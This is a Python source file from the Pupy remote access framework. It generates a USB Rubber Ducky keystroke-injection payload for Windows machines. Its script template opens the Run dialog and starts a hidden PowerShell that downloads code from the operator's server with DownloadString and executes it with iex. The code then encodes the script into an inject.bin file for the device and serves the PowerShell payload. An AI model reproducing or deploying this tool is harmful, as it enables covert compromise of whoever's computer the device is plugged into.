# -*- coding: UTF8 -*-
#Author: @bobsecq
#Contributor(s):

from pupylib.utils.term import colorize
import subprocess
try:
    import ConfigParser as configparser
except ImportError:
    import configparser


class rubber_ducky():
    '''
    '''
    TARGET_OS_MANAGED = ['Windows']
    ENCODE_CMD = "java -jar {0}  -i {1}  -l {2} -o {3}" #{0} encode.jar file, {1} rubber ducky script file, {2} layout file, {3} output file
    WINDOWS_SCRIPT = """DELAY 3000\nGUI r\nDELAY 500\nSTRING powershell.exe -w hidden -noni -nop -c "iex(New-Object System.Net.WebClient).DownloadString('http://{0}:{1}/p')"\nENTER"""#{0} ip {1} port
    
    def __init__(self, conf, link_port=8080, targetOs='Windows'):
        '''
        '''
        self.conf = conf
        i=conf["launcher_args"].index("--host")+1
        self.link_ip = conf["launcher_args"][i].split(":",1)[0]
        self.link_port = link_port
        self.__loadRubberDuckyConf__()
        self.rubberDuckyScriptFilename = 'rubberDuckyPayload.txt'
        self.rubberDuckyBinFilename = 'inject.bin'
        self.targetOs = targetOs
        if self.targetOs not in self.TARGET_OS_MANAGED:
            print(colorize("[+] ","red")+"Target OS ({0}) is not valid. It has to be in {1}".format(targetOs, self.TARGET_OS_MANAGED))
        
    def createRubberDuckyScriptForWindowsTarget(self):
        '''
        '''
        with open(self.rubberDuckyScriptFilename, 'wb') as w:
            w.write(self.WINDOWS_SCRIPT.format(self.link_ip, self.link_port))
        print(colorize("[+] ","green")+"Rubber ducky script file generated in {0}".format(self.rubberDuckyScriptFilename))
        
    def generateInjectBinFile(self):
        '''
        returns True if no error
        Otherwise returns False
        '''
        rubberDuckyEncodeCmd = self.ENCODE_CMD.format(self.encoderPath, self.rubberDuckyScriptFilename, self.keyboardLayoutPath, self.rubberDuckyBinFilename)
        try:
            output = subprocess.check_output(rubberDuckyEncodeCmd, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell = True)
        except subprocess.CalledProcessError, e:
            print(colorize("[+] ","red")+"Impossible to generate {0} file with encoder: {1}".format(self.rubberDuckyBinFilename, repr(e.output)))
        except Exception, e:
            print(colorize("[+] ","red")+"Impossible to generate {0} file with encoder: {1}".format(self.rubberDuckyBinFilename, repr(e)))
            return False
        else:
            print(colorize("[+] ","green")+"encoder output:\n{0}".format(output))
            print(colorize("[+] ","green")+"{0} has been created".format(self.rubberDuckyBinFilename))
            return True

    def __loadRubberDuckyConf__(self):
        '''
        '''
        config = configparser.ConfigParser()
        config.read("pupy.conf")
        self.encoderPath = config.get("rubber_ducky","encoder_path")
        self.keyboardLayoutPath = config.get("rubber_ducky","default_keyboard_layout_path")
        if self.encoderPath == "TO_FILL":
            print(colorize("[+] ","red")+"The 'encoder_path' value has to be filled in pupy.conf for generating inject.bin")
        if self.keyboardLayoutPath == "TO_FILL":
            print(colorize("[+] ","red")+"The 'default_keyboard_layout_path' value has to be filled in pupy.conf for generating inject.bin")

    def generateAllForOStarget(self):
        '''
        '''
        if self.targetOs == 'Windows':
            from ps1_oneliner import serve_ps1_payload
            self.createRubberDuckyScriptForWindowsTarget()
            self.generateInjectBinFile()
            print(colorize("[+] ","green")+"copy/paste inject.bin file on USB rubber ducky device")
            print(colorize("[+] ","green")+"You should not pay attention to the following message (powershell command). This powershell command is embedded in the inject.bin file generated")
            serve_ps1_payload(self.conf, link_ip=self.link_ip)
        
